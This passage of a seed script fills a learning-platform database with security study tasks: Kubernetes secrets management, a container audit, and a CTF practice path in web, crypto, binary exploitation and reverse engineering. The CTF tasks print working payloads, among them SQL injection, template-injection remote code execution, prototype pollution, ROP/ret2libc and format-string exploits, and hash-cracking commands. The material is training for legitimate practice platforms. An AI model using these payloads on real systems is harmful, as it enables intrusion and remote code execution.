- [ ] Tuned false positives`],

	['Implement secrets management in K8s', 'Use External Secrets Operator with Vault or cloud secret managers.',
`## External Secrets Operator

### Install
\`\`\`bash
helm repo add external-secrets https://charts.external-secrets.io
helm install external-secrets external-secrets/external-secrets \\
  --namespace external-secrets --create-namespace
\`\`\`

### Configure SecretStore (Vault)
\`\`\`yaml
apiVersion: external-secrets.io/v1beta1
kind: ClusterSecretStore
metadata:
  name: vault-store
spec:
  provider:
    vault:
      server: "https://vault.example.com"
      path: "secret"
      version: "v2"
      auth:
        kubernetes:
          mountPath: "kubernetes"
          role: "external-secrets"
\`\`\`

### ExternalSecret Resource
\`\`\`yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: my-secret
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-store
    kind: ClusterSecretStore
  target:
    name: my-k8s-secret
  data:
    - secretKey: password
      remoteRef:
        key: myapp/config
        property: password
\`\`\`

### AWS Secrets Manager
\`\`\`yaml
apiVersion: external-secrets.io/v1beta1
kind: ClusterSecretStore
metadata:
  name: aws-store
spec:
  provider:
    aws:
      service: SecretsManager
      region: us-east-1
      auth:
        jwt:
          serviceAccountRef:
            name: external-secrets
\`\`\`

### Why Not Native K8s Secrets?
\`\`\`
- Stored as base64 (not encrypted by default)
- etcd encryption possible but complex
- No automatic rotation
- No audit logging
- No centralized management
\`\`\`

## Completion Criteria
- [ ] ESO installed
- [ ] Connected to secret backend
- [ ] Secrets synced to K8s
- [ ] Rotation working`],

	['Perform a container security assessment', 'Full audit of container environment: images, runtime config, network, secrets, and RBAC.',
`## Container Security Assessment

### 1. Image Security
\`\`\`bash
# Scan all images in cluster
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | \\
  tr ' ' '\\n' | sort -u | xargs -I {} trivy image {}

# Check for:
☐ Base image vulnerabilities
☐ Hardcoded secrets in layers
☐ Running as root
☐ Unnecessary packages
\`\`\`

### 2. Runtime Configuration
\`\`\`bash
# Audit with kube-bench
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job.batch/kube-bench

# Check for:
☐ Privileged containers
☐ Host namespaces
☐ Capabilities
☐ Security contexts
\`\`\`

### 3. Network Security
\`\`\`bash
# List all network policies
kubectl get networkpolicies -A

# Check for:
☐ Default deny policies
☐ Namespace isolation
☐ Ingress controller security
☐ Service mesh encryption
\`\`\`

### 4. Secrets Management
\`\`\`bash
# Find secrets
kubectl get secrets -A

# Check for:
☐ etcd encryption enabled
☐ External secrets management
☐ Secret rotation
☐ No secrets in env vars
\`\`\`

### 5. RBAC Audit
\`\`\`bash
# Use rbac-tool or kubectl-who-can
kubectl who-can create pods
kubectl who-can get secrets

# Check for:
☐ Least privilege
☐ No cluster-admin to users
☐ Service account restrictions
☐ Namespace scoping
\`\`\`

### Report Template
\`\`\`markdown
## Executive Summary
## Findings by Category
### Critical
### High
### Medium
## Remediation Roadmap
\`\`\`

## Completion Criteria
- [ ] All categories assessed
- [ ] Findings documented
- [ ] Remediation prioritized
- [ ] Report delivered`],
];
devM3Tasks.forEach((t, i) => insertTask.run(devM3.lastInsertRowid, t[0], t[1], t[2], i, now));

// ============================================================================
// CTF PRACTICE
// ============================================================================
const ctfPath = insertPath.run(
	'CTF Challenge Practice',
	'Structured practice for Capture The Flag competitions. Cover web, crypto, pwn, reverse engineering, and forensics challenges.',
	'amber',
	now
);

// Module 1: Web Challenges
const ctfM1 = insertModule.run(ctfPath.lastInsertRowid, 'Web Exploitation', 'Solve web-based CTF challenges', 0, now);
const ctfM1Tasks: [string, string, string][] = [
	['Complete 10 easy web challenges on picoCTF', 'Start with picoCTF web challenges. Focus on: source code inspection, cookies, hidden paths, and basic injection.',
`## picoCTF Web Challenges

### Getting Started
\`\`\`
1. Go to picoctf.org
2. Create account
3. Navigate to Practice → Web Exploitation
4. Start with lowest point values
\`\`\`

### Common Techniques

#### Source Code Inspection
\`\`\`html
<!-- View page source (Ctrl+U) -->
<!-- Look for comments, hidden fields, JS files -->
<!-- Flag might be in HTML comment: flag{...} -->
\`\`\`

#### Cookie Manipulation
\`\`\`javascript
// Check cookies in DevTools
document.cookie
// Edit cookie: isAdmin=true
// Or use browser extension: EditThisCookie
\`\`\`

#### Hidden Paths
\`\`\`bash
# Common paths to check
/robots.txt
/sitemap.xml
/.git/
/admin/
/flag.txt
/backup/
\`\`\`

#### Basic Injection
\`\`\`
# In input fields
' OR '1'='1
<script>alert(1)</script>
{{7*7}}
\`\`\`

### Tools
- Browser DevTools (F12)
- Burp Suite Community
- curl for quick requests

### Track Progress
\`\`\`
□ Challenge 1: _____ pts
□ Challenge 2: _____ pts
...
□ Challenge 10: _____ pts
\`\`\`

## Completion Criteria
- [ ] Completed 10 challenges
- [ ] Used each technique at least once
- [ ] Documented solutions
- [ ] Understand why each worked`],

	['Solve PortSwigger Web Academy SQLi labs', 'Complete all SQL injection labs. Progress from basic to blind to out-of-band.',
`## PortSwigger SQL Injection Labs

### Lab Categories
1. **Retrieving hidden data** - WHERE clause injection
2. **Subverting application logic** - Login bypass
3. **UNION attacks** - Data extraction
4. **Examining the database** - Enumeration
5. **Blind SQL injection** - Boolean/time-based
6. **Out-of-band** - DNS/HTTP exfiltration

### Key Payloads to Learn

#### Basic Detection
\`\`\`sql
'
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
\`\`\`

#### UNION Attack
\`\`\`sql
-- Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)

-- Extract data
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
\`\`\`

#### Blind Boolean
\`\`\`sql
-- True condition (normal response)
' AND '1'='1
-- False condition (different response)
' AND '1'='2
-- Extract data character by character
' AND SUBSTRING(password,1,1)='a
\`\`\`

#### Blind Time-based
\`\`\`sql
-- Cause delay if condition true
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
\`\`\`

### Lab Order
\`\`\`
1. Apprentice labs (basics)
2. Practitioner labs (intermediate)
3. Expert labs (advanced)
\`\`\`

## Completion Criteria
- [ ] All Apprentice labs complete
- [ ] All Practitioner labs complete
- [ ] Can perform UNION attacks
- [ ] Understand blind techniques`],

	['Master SSTI exploitation', 'Practice template injection on HackTheBox or TryHackMe. Learn Jinja2, Twig, and Freemarker payloads.',
`## Server-Side Template Injection

### Detection
\`\`\`
# Test payloads (try each)
{{7*7}}      → 49 (Jinja2, Twig)
\${7*7}      → 49 (Freemarker, Velocity)
<%= 7*7 %>  → 49 (ERB)
#{7*7}      → 49 (Slim)
\`\`\`

### Jinja2 (Python/Flask)
\`\`\`python
# Read config
{{ config }}
{{ config.items() }}

# Access classes for RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find subprocess.Popen (index varies)
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate() }}

# Simplified payload
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
\`\`\`

### Twig (PHP)
\`\`\`php
# Information disclosure
{{_self.env.display(app.request)}}

# RCE (older versions)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
\`\`\`

### Freemarker (Java)
\`\`\`java
# Execute command
<#assign ex="freemarker.template.utility.Execute"?new()>
\${ ex("id") }
\`\`\`

### Practice Resources
- HackTheBox: Search "SSTI" challenges
- TryHackMe: SSTI room
- PortSwigger: Server-side template injection labs

## Completion Criteria
- [ ] Detected SSTI in 3 different engines
- [ ] Achieved RCE in at least one
- [ ] Documented working payloads
- [ ] Understand sandbox escapes`],

	['Solve prototype pollution challenges', 'Find and solve JS prototype pollution CTF challenges. Understand the vuln and how to chain.',
`## Prototype Pollution Basics

### What Is It?
\`\`\`javascript
// JavaScript inheritance via prototype chain
const obj = {};
obj.__proto__.polluted = true;
const newObj = {};
console.log(newObj.polluted); // true!
\`\`\`

### Vulnerable Code Patterns
\`\`\`javascript
// Recursive merge (dangerous)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Exploit
merge({}, JSON.parse('{"__proto__":{"admin":true}}'))
\`\`\`

### Exploitation Payloads
\`\`\`json
// Via __proto__
{"__proto__": {"admin": true}}

// Via constructor.prototype
{"constructor": {"prototype": {"admin": true}}}
\`\`\`

### Chaining for Impact

#### XSS via Template
\`\`\`javascript
// If app uses Handlebars
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
\`\`\`

#### RCE via child_process
\`\`\`javascript
// Pollute NODE_OPTIONS or similar
{"__proto__": {"shell": "/bin/bash", "argv0": "node"}}
\`\`\`

### Practice
- HackTheBox web challenges
- CTFtime.org (search "prototype pollution")
- Real-world reports on HackerOne

## Completion Criteria
- [ ] Understand prototype chain
- [ ] Exploited basic pollution
- [ ] Chained with another vuln
- [ ] Documented working payloads`],

	['Complete 5 hard web CTF challenges', 'Tackle harder challenges from recent CTFs. Time yourself and compare to writeups after.',
`## Hard Web Challenge Strategy

### Finding Challenges
\`\`\`
1. CTFtime.org - Recent CTF archives
2. HackTheBox - Insane difficulty
3. Root-Me - Expert challenges
4. Past DefCon/Google CTF
\`\`\`

### Methodology
\`\`\`
1. Recon (30 min max)
   - Map all endpoints
   - Identify technologies
   - Review source code

2. Identify attack surface (30 min)
   - Input vectors
   - Authentication
   - File uploads
   - API endpoints

3. Test hypotheses (1-2 hours)
   - Focus on promising vectors
   - Document findings

4. Chain vulnerabilities
   - Combine findings
   - Think creatively

5. If stuck after 2 hours
   - Take a break
   - Review writeups for hints
   - Learn the technique
\`\`\`

### Track Your Progress
\`\`\`markdown
## Challenge 1: [Name]
- CTF: [Event name]
- Time spent: X hours
- Solved: Yes/No
- Technique: [e.g., SSTI + SSRF chain]
- What I learned: [Notes]

## Challenge 2: ...
\`\`\`

### Common Hard Techniques
- Multi-step chains
- Race conditions
- Deserialization gadgets
- Browser exploitation
- Novel bypasses

## Completion Criteria
- [ ] Attempted 5 hard challenges
- [ ] Solved at least 2 independently
- [ ] Read writeups for unsolved
- [ ] Documented new techniques`],
];
ctfM1Tasks.forEach((t, i) => insertTask.run(ctfM1.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 2: Cryptography
const ctfM2 = insertModule.run(ctfPath.lastInsertRowid, 'Cryptography', 'Break crypto in CTF challenges', 1, now);
const ctfM2Tasks: [string, string, string][] = [
	['Learn classical cipher attacks', 'Practice breaking: Caesar, Vigenere, substitution ciphers. Use frequency analysis and known plaintext attacks.',
`## Classical Cipher Attacks

### Caesar Cipher (ROT-N)
\`\`\`python
# Brute force all 26 rotations
def caesar_brute(ciphertext):
    for shift in range(26):
        plaintext = ''.join(
            chr((ord(c) - ord('a') - shift) % 26 + ord('a'))
            if c.isalpha() else c
            for c in ciphertext.lower()
        )
        print(f"ROT-{shift}: {plaintext}")
\`\`\`

### Frequency Analysis
\`\`\`
English letter frequency:
E(12.7%) T(9.1%) A(8.2%) O(7.5%) I(7.0%) N(6.7%)

Steps:
1. Count letter frequencies in ciphertext
2. Map most common to E, then T, etc.
3. Look for patterns (THE, AND, etc.)
4. Refine mappings iteratively
\`\`\`

### Vigenère Cipher
\`\`\`python
# Find key length with Kasiski/IC
# Then treat as multiple Caesar ciphers

from collections import Counter

def index_of_coincidence(text):
    freq = Counter(text)
    n = len(text)
    return sum(f*(f-1) for f in freq.values()) / (n*(n-1))

# English text IC ≈ 0.067
# Random IC ≈ 0.038
\`\`\`

### Tools
- CyberChef: dcode.fr/caesar-cipher
- quipqiup.com: Substitution solver
- Vigenère: guballa.de/vigenere-solver

## Completion Criteria
- [ ] Broke Caesar cipher by hand
- [ ] Used frequency analysis
- [ ] Solved Vigenère challenge
- [ ] Understand Index of Coincidence`],

	['Attack weak RSA implementations', 'Solve RSA challenges: small e, common modulus, Wiener attack, Coppersmith.',
`## RSA Attack Techniques

### Small Public Exponent (e=3)
\`\`\`python
# If m^e < n, ciphertext = m^e (no modular reduction)
import gmpy2
c = ciphertext
m = gmpy2.iroot(c, 3)[0]  # Cube root
\`\`\`

### Common Modulus Attack
\`\`\`python
# Same n, different e, same message
# c1 = m^e1 mod n
# c2 = m^e2 mod n
# If gcd(e1, e2) = 1, can recover m

from Crypto.Util.number import inverse
def common_modulus(n, e1, e2, c1, c2):
    gcd, a, b = extended_gcd(e1, e2)
    m = (pow(c1, a, n) * pow(c2, b, n)) % n
    return m
\`\`\`

### Wiener's Attack (small d)
\`\`\`python
# When d < n^0.25 / 3
# Use continued fractions on e/n

import owiener
d = owiener.attack(e, n)
\`\`\`

### Factorization
\`\`\`python
# If n is small or has known factors
from factordb.factordb import FactorDB
f = FactorDB(n)
f.connect()
factors = f.get_factor_list()
\`\`\`

### RsaCtfTool
\`\`\`bash
git clone https://github.com/RsaCtfTool/RsaCtfTool
python RsaCtfTool.py --publickey pub.pem --uncipherfile flag.enc
\`\`\`

## Completion Criteria
- [ ] Exploited small e
- [ ] Used Wiener's attack
- [ ] Factored weak n
- [ ] Used RsaCtfTool`],

	['Exploit AES/block cipher weaknesses', 'Practice: ECB mode attacks, padding oracle, bit flipping in CBC.',
`## Block Cipher Attacks

### ECB Mode Detection
\`\`\`python
# Same plaintext block = same ciphertext block
# Look for repeated 16-byte blocks

from collections import Counter
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
if len(blocks) != len(set(blocks)):
    print("ECB mode detected!")
\`\`\`

### ECB Cut-and-Paste
\`\`\`
# Rearrange encrypted blocks
# Example: Create admin token from user token
# If blocks are: [email block][role=user]
# Craft email to align "admin" at block boundary
\`\`\`

### CBC Bit Flipping
\`\`\`python
# Flipping bit in ciphertext block N affects:
# - Block N: corrupted
# - Block N+1: that exact bit flipped in plaintext

# To change plaintext byte:
# new_ct[i] = old_ct[i] ^ old_pt[i+16] ^ desired_pt[i+16]

def cbc_bitflip(ct, old_byte, new_byte, position):
    ct = bytearray(ct)
    block_pos = (position // 16) * 16 - 16
    byte_pos = position % 16
    ct[block_pos + byte_pos] ^= old_byte ^ new_byte
    return bytes(ct)
\`\`\`

### Padding Oracle Attack
\`\`\`python
# If server reveals padding validity
# Can decrypt entire ciphertext byte by byte

# For each byte position:
# - Modify previous block byte
# - Brute force until valid padding
# - Recover plaintext byte

# Tool: PadBuster
# padbuster URL encrypted_cookie 16 -encoding 0
\`\`\`

## Completion Criteria
- [ ] Detected ECB mode
- [ ] Performed bit flip attack
- [ ] Understand padding oracle
- [ ] Exploited at least one block cipher vuln`],

	['Solve hash-based challenges', 'Attack: length extension, hash collisions, weak MAC constructions.',
`## Hash Attack Techniques

### Length Extension Attack
\`\`\`python
# Vulnerable: MAC = H(secret || message)
# Can compute H(secret || message || padding || extra)
# Without knowing secret!

# Tool: hash_extender
# Works on MD5, SHA1, SHA256

import hashpumpy
new_hash, new_msg = hashpumpy.hashpump(
    original_hash,
    original_message,
    data_to_append,
    secret_length
)
\`\`\`

### Secure Alternative
\`\`\`python
# HMAC is NOT vulnerable
# HMAC(key, msg) = H((key⊕opad) || H((key⊕ipad) || msg))
\`\`\`

### Hash Collisions

#### MD5 Collisions
\`\`\`bash
# Generate two files with same MD5
# FastColl tool
./fastcoll -o file1.bin file2.bin
md5sum file1.bin file2.bin  # Same hash!
\`\`\`

#### SHA-1 Collisions
\`\`\`
# SHAttered attack (expensive to generate)
# Known collision PDFs: shattered.io
\`\`\`

### Weak Hash Detection
\`\`\`python
# Recognize hash types
32 hex chars: MD5
40 hex chars: SHA-1
64 hex chars: SHA-256

# Crack with hashcat
hashcat -m 0 hash.txt wordlist.txt  # MD5
hashcat -m 100 hash.txt wordlist.txt  # SHA-1
\`\`\`

## Completion Criteria
- [ ] Performed length extension
- [ ] Generated hash collision
- [ ] Cracked weak hashes
- [ ] Know when attacks apply`],

	['Complete 5 medium crypto challenges', 'Solve crypto challenges from CryptoHack.org. Focus on understanding the math behind each attack.',
`## CryptoHack Learning Path

### Categories to Cover
\`\`\`
1. Introduction
   - ASCII, Hex, Base64 encoding
   - XOR properties

2. Mathematics
   - Modular arithmetic
   - Extended GCD
   - Chinese Remainder Theorem

3. Symmetric Cryptography
   - Block cipher modes
   - Key exchange

4. RSA
   - Public/private keys
   - Attacks and vulnerabilities

5. Elliptic Curves
   - Point operations
   - ECDSA
\`\`\`

### Key Math Concepts
\`\`\`python
# Modular inverse
from Crypto.Util.number import inverse
inv = inverse(a, n)  # a * inv ≡ 1 (mod n)

# Chinese Remainder Theorem
from sympy.ntheory.modular import crt
result = crt([mod1, mod2], [rem1, rem2])

# Extended GCD
def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd, x, y = extended_gcd(b % a, a)
    return gcd, y - (b // a) * x, x
\`\`\`

### Challenge Approach
\`\`\`
1. Read the challenge carefully
2. Identify the crypto primitive
3. Research known attacks
4. Implement in Python
5. Document the math
\`\`\`

### Track Progress
\`\`\`markdown
## Challenge Log
| Name | Category | Points | Solved | Key Technique |
|------|----------|--------|--------|---------------|
| ... | RSA | 50 | ✓ | Small e attack |
\`\`\`

## Completion Criteria
- [ ] Completed 5 challenges
- [ ] From at least 3 categories
- [ ] Understood the underlying math
- [ ] Can explain each attack`],
];
ctfM2Tasks.forEach((t, i) => insertTask.run(ctfM2.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 3: Binary Exploitation
const ctfM3 = insertModule.run(ctfPath.lastInsertRowid, 'Binary Exploitation (Pwn)', 'Memory corruption and binary attacks', 2, now);
const ctfM3Tasks: [string, string, string][] = [
	['Set up pwn environment', 'Install pwntools, GDB with pwndbg/GEF, Ghidra. Configure for 32-bit and 64-bit targets.',
`## Pwn Environment Setup

### pwntools (Python)
\`\`\`bash
pip install pwntools
\`\`\`
\`\`\`python
from pwn import *
context.arch = 'amd64'  # or 'i386'
context.log_level = 'debug'

p = process('./binary')
# or
p = remote('host', port)
\`\`\`

### GDB with pwndbg
\`\`\`bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
\`\`\`
\`\`\`
# Useful commands
pwndbg> checksec          # Security mitigations
pwndbg> vmmap             # Memory layout
pwndbg> cyclic 100        # Pattern generation
pwndbg> cyclic -l 0x6161  # Find offset
\`\`\`

### 32-bit Support
\`\`\`bash
sudo dpkg --add-architecture i386
sudo apt install libc6:i386 libncurses5:i386 libstdc++6:i386
\`\`\`

### Ghidra
\`\`\`
1. Download from ghidra-sre.org
2. Extract and run ghidraRun
3. Create project, import binary
4. Auto-analyze
\`\`\`

### Quick Template
\`\`\`python
#!/usr/bin/env python3
from pwn import *

binary = './vuln'
elf = ELF(binary)
context.binary = elf

# Local or remote
if args.REMOTE:
    p = remote('host', 1337)
else:
    p = process(binary)

# Exploit here
payload = b'A' * offset
p.sendline(payload)
p.interactive()
\`\`\`

## Completion Criteria
- [ ] pwntools installed
- [ ] GDB with pwndbg working
- [ ] 32-bit binaries run
- [ ] Ghidra configured`],

	['Master buffer overflow basics', 'Solve stack buffer overflow challenges. Control EIP/RIP, build ROP chains, bypass NX with ret2libc.',
`## Stack Buffer Overflow

### Finding Offset
\`\`\`python
from pwn import *
# Generate pattern
pattern = cyclic(200)

# Find offset after crash
# EIP = 0x61616168
offset = cyclic_find(0x61616168)  # Example: 44
\`\`\`

### Control Return Address
\`\`\`python
payload = b'A' * offset
payload += p32(target_address)  # 32-bit
# or
payload += p64(target_address)  # 64-bit
\`\`\`

### ret2libc (Bypass NX)
\`\`\`python
# No execute on stack? Return to libc functions

# Find libc base (if ASLR, need leak)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = leaked_addr - libc.symbols['puts']

# Build chain
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))

payload = b'A' * offset
payload += rop.chain()
\`\`\`

### ROP Chains
\`\`\`python
# Find gadgets
rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(binsh_addr)
rop.raw(elf.symbols['system'])

# Or use automatic
rop.call(elf.symbols['system'], [binsh_addr])
\`\`\`

### Common Gadgets Needed
\`\`\`
pop rdi; ret     # First argument (64-bit)
pop rsi; ret     # Second argument
pop rdx; ret     # Third argument
ret              # Stack alignment
\`\`\`

## Completion Criteria
- [ ] Found offset with cyclic
- [ ] Controlled return address
- [ ] Built ret2libc exploit
- [ ] Used ROP chain`],

	['Exploit format string vulnerabilities', 'Practice reading/writing memory with format strings. Leak addresses and overwrite GOT entries.',
`## Format String Attacks

### The Vulnerability
\`\`\`c
// Vulnerable
printf(user_input);

// Safe
printf("%s", user_input);
\`\`\`

### Reading Memory
\`\`\`python
# Leak stack values
payload = b'%p.' * 20  # Leak pointers

# Leak specific offset
payload = b'%7$p'  # 7th value on stack

# Read arbitrary address
payload = p64(target_addr) + b'%7$s'
\`\`\`

### Finding Offset
\`\`\`python
# Send pattern, find where it appears
for i in range(1, 50):
    p.sendline(f'AAAA%{i}$p')
    if '0x41414141' in p.recvline().decode():
        print(f'Offset: {i}')
        break
\`\`\`

### Writing Memory
\`\`\`python
# Write using %n (writes number of chars printed)
# pwntools fmtstr_payload makes this easy

from pwn import *
offset = 7

# Write value to address
payload = fmtstr_payload(offset, {target_addr: value})

# Overwrite GOT entry
got_puts = elf.got['puts']
win_addr = elf.symbols['win']
payload = fmtstr_payload(offset, {got_puts: win_addr})
\`\`\`

### Manual %n Write
\`\`\`
%<value>c%<offset>$n

# Write 0x41 to 6th stack position
%65c%6$n

# For larger values, write in parts
%hn = 2 bytes
%hhn = 1 byte
\`\`\`

## Completion Criteria
- [ ] Leaked stack addresses
- [ ] Found format string offset
- [ ] Wrote to arbitrary address
- [ ] Overwrote GOT entry`],

	['Learn heap exploitation', 'Study glibc malloc internals. Solve heap challenges: use-after-free, double free, house of techniques.',
`## Heap Exploitation Basics

### glibc Malloc Overview
\`\`\`
Chunk Structure:
[prev_size][size|flags][user_data...]

Bins:
- Fastbins: 16-88 bytes (LIFO, singly linked)
- Unsorted bin: Recently freed
- Small bins: <512 bytes (FIFO, doubly linked)
- Large bins: >=512 bytes
\`\`\`

### Use-After-Free
\`\`\`python
# Pattern:
# 1. Allocate chunk A
# 2. Free chunk A
# 3. Allocate chunk B (same size) - gets A's memory
# 4. Use stale pointer to A - actually points to B

# If A had function pointer, now controlled
\`\`\`

### Double Free
\`\`\`python
# Modern glibc has protections, need bypass
# Classic tcache double free:

free(a)  # a -> tcache
free(b)  # b -> a -> tcache
free(a)  # a -> b -> a (circular)

malloc()  # Returns a
# Write to a, overwrite fd pointer
malloc()  # Returns b
malloc()  # Returns a again with modified fd
malloc()  # Returns arbitrary address!
\`\`\`

### Tcache Poisoning
\`\`\`python
# Overwrite fd pointer in freed chunk
# Next allocation returns arbitrary address

# Leak heap address first
# Modify fd to target
# Allocate until you get target chunk
\`\`\`

### House Techniques
\`\`\`
House of Force: Overwrite top chunk size
House of Spirit: Fake chunk on stack
House of Orange: Unsorted bin attack
House of Einherjar: Overlapping chunks
\`\`\`

### Tools
\`\`\`
pwndbg> heap           # Heap overview
pwndbg> bins           # Bin contents
pwndbg> vis_heap_chunks
\`\`\`

## Completion Criteria
- [ ] Understand chunk structure
- [ ] Exploited use-after-free
- [ ] Performed tcache attack
- [ ] Know one house technique`],

	['Complete 5 pwn challenges on pwnable.kr/tw', 'Work through progressive difficulty. Document your exploits and understand mitigations bypassed.',
`## Pwnable Practice Sites

### pwnable.kr
\`\`\`
Beginner:
- fd (file descriptors)
- collision (hash collision)
- bof (buffer overflow)
- flag (reversing)
- passcode (format string)

Intermediate:
- random (predictable random)
- input (program arguments)
- leg (ARM assembly)
\`\`\`

### pwnable.tw
\`\`\`
Start Here:
- start (shellcode)
- orw (open-read-write only)
- calc (ROP)
- dubblesort (leak + overflow)
\`\`\`

### Challenge Log Template
\`\`\`markdown
## Challenge: [Name]
**Site**: pwnable.kr
**Points**: XX

### Analysis
- Binary type: ELF 32/64-bit
- Protections: NX, ASLR, PIE, Canary

### Vulnerability
[Description of the bug]

### Exploit Strategy
1. Leak address via [method]
2. Build ROP chain / shellcode
3. Overwrite return address

### Exploit Code
\`\`\`python
[Your exploit]
\`\`\`

### Mitigations Bypassed
- [x] ASLR: Leaked libc address
- [x] NX: Used ret2libc

### Lessons Learned
[What new technique you learned]
\`\`\`

### Common Mitigations
\`\`\`
ASLR: Randomizes addresses (need leak)
NX: No execute on stack (use ROP)
Canary: Detect stack overflow (leak or bypass)
PIE: Randomizes binary base (need leak)
RELRO: Protects GOT (partial/full)
\`\`\`

## Completion Criteria
- [ ] Solved 5 challenges
- [ ] At least 2 from each site
- [ ] Documented all exploits
- [ ] Bypassed multiple mitigations`],
];
ctfM3Tasks.forEach((t, i) => insertTask.run(ctfM3.lastInsertRowid, t[0], t[1], t[2], i, now));

// Module 4: Reverse Engineering
const ctfM4 = insertModule.run(ctfPath.lastInsertRowid, 'Reverse Engineering', 'Analyze and understand binaries', 3, now);
const ctfM4Tasks: [string, string, string][] = [
	['Learn x86/x64 assembly basics', 'Understand registers, calling conventions, stack operations. Practice reading disassembly before running binaries.',
`## x86/x64 Assembly Fundamentals

### Registers (64-bit)
\`\`\`
General Purpose:
RAX, RBX, RCX, RDX - Data registers
RSI, RDI - Source/Destination index
RBP - Base pointer (stack frame)
RSP - Stack pointer
R8-R15 - Extra registers (64-bit only)

Special:
RIP - Instruction pointer
RFLAGS - Status flags (ZF, SF, CF, OF)
\`\`\`

### Calling Convention (x64 Linux)
\`\`\`
Arguments: RDI, RSI, RDX, RCX, R8, R9
Return value: RAX
Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
Callee-saved: RBX, RBP, R12-R15
\`\`\`

### Common Instructions
\`\`\`asm
mov rax, rbx    ; rax = rbx
add rax, 5      ; rax += 5
sub rax, rbx    ; rax -= rbx
xor rax, rax    ; rax = 0 (common idiom)
cmp rax, rbx    ; Compare (sets flags)
jmp label       ; Unconditional jump
je  label       ; Jump if equal (ZF=1)
jne label       ; Jump if not equal
call func       ; Push return addr, jump
ret             ; Pop return addr, jump
push rax        ; Push to stack
pop rax         ; Pop from stack
lea rax, [rbx]  ; Load effective address
\`\`\`

### Stack Frame
\`\`\`
High addresses
+----------------+
| Return address |
+----------------+
| Saved RBP      | <- RBP points here
+----------------+
| Local var 1    |
+----------------+
| Local var 2    | <- RSP points here
+----------------+
Low addresses
\`\`\`

## Completion Criteria
- [ ] Know common registers
- [ ] Understand calling convention
- [ ] Read basic disassembly
- [ ] Trace stack operations`],

	['Master Ghidra for static analysis', 'Reverse crackme challenges. Use decompiler, rename variables, annotate functions.',
`## Ghidra Workflow

### Initial Setup
\`\`\`
1. File → Import File → Select binary
2. Yes to analyze
3. Check "Decompiler Parameter ID" in analysis options
\`\`\`

### Navigation
\`\`\`
G - Go to address
X - Show references to
Ctrl+Shift+E - Search for strings
F - Create function
D - Disassemble
\`\`\`

### Improving Readability

#### Rename Variables
\`\`\`
1. Click variable in decompiler
2. Press L to rename
3. Use meaningful names:
   - local_10 → buffer
   - param_1 → user_input
\`\`\`

#### Retype Variables
\`\`\`
1. Right-click variable
2. Retype variable
3. Use appropriate type:
   - char* for strings
   - int for counters
\`\`\`

#### Add Comments
\`\`\`
; for end-of-line comment
Press ; in listing view
\`\`\`

### Analyzing a Crackme
\`\`\`
1. Find main() or entry point
2. Look for:
   - strcmp, strncmp (password check)
   - Input functions (scanf, gets, fgets)
   - Success/failure messages
3. Trace the validation logic
4. Work backwards from success condition
\`\`\`

### Example Analysis
\`\`\`c
// Before cleanup
if (local_10 == 0x539) {
    puts("Correct!");
}

// After analysis: 0x539 = 1337
if (user_input == 1337) {
    puts("Correct!");
}
\`\`\`

## Completion Criteria
- [ ] Comfortable navigating Ghidra
- [ ] Can rename and retype variables
- [ ] Solved a crackme using decompiler
- [ ] Documented a function's logic`],

	['Defeat anti-debugging tricks', 'Bypass: IsDebuggerPresent, timing checks, self-modifying code.',
`## Common Anti-Debug Techniques

### IsDebuggerPresent (Windows)
\`\`\`c
if (IsDebuggerPresent()) {
    exit(1);
}
\`\`\`
\`\`\`
Bypass:
1. Patch JZ/JNZ instruction
2. Set RAX=0 after call
3. Hook the function (Scylla, x64dbg)
\`\`\`

### Timing Checks
\`\`\`c
clock_t start = clock();
// Code
clock_t end = clock();
if (end - start > THRESHOLD) {
    exit(1);  // Too slow = debugged
}
\`\`\`
\`\`\`
Bypass:
1. NOP out the check
2. Modify THRESHOLD value
3. Set breakpoint after check
\`\`\`

### PEB BeingDebugged Flag
\`\`\`c
// Checking PEB directly
__asm {
    mov eax, fs:[0x30]  // PEB
    movzx eax, byte ptr [eax+2]  // BeingDebugged
}
\`\`\`
\`\`\`
Bypass:
1. Modify PEB in debugger
2. pwndbg: set $fs_base->BeingDebugged = 0
\`\`\`

### Self-Modifying Code
\`\`\`c
// Code decrypts itself at runtime
for (int i = 0; i < len; i++) {
    code[i] ^= key;
}
((void(*)())code)();
\`\`\`
\`\`\`
Approach:
1. Set breakpoint after decryption
2. Dump decrypted code
3. Analyze separately
\`\`\`

### ptrace Check (Linux)
\`\`\`c
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
    exit(1);  // Already being traced
}
\`\`\`
\`\`\`
Bypass:
1. LD_PRELOAD hook ptrace
2. Patch the check
\`\`\`

## Completion Criteria
- [ ] Bypassed IsDebuggerPresent
- [ ] Handled timing check
- [ ] Analyzed self-modifying code
- [ ] Know multiple bypass methods`],

	['Reverse obfuscated code', 'Tackle VMs and custom obfuscation. Trace execution, identify patterns, write deobfuscation scripts.',
`## Obfuscation Techniques

### Opaque Predicates
\`\`\`c
// Always true but hard to analyze
